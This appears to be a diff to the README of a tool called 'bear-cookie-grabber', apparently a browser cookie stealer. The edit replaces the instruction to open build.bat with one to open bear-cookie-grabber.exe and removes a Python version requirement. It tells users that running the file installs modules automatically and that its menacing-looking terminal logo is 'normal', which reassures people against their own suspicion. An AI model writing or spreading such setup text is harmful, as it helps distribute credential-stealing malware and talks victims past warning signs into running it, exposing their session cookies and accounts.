@@ -26,20 +26,16 @@
 ## Setup
 Make sure you have [Python](https://www.python.org/downloads/) installed and it is added to your [Path](https://youtu.be/Y2q_b4ugPWk)
 
-```sh-session
-python v3.10.1 or higher
-```
-
 ### 1. Download The Files:
 
 ```
 Once you've downloaded the files extract the folder so it's no longer a .zip file.
 ```
 
-### 2. Open The build.bat File:
+### 2. Open The bear-cookie-grabber.exe File:
 
 ```
-You dont need to install any modules opening this will install them for you. Then you can open the build.bat which will
+You dont need to install any modules opening this will install them for you. Then you can open the bear-cookie-grabber.exe which will
 open a terminal with the bear-cookie-grabber logo. Don't worry although this looks quite menacing its just aesthetic and is normal.
 ```
 
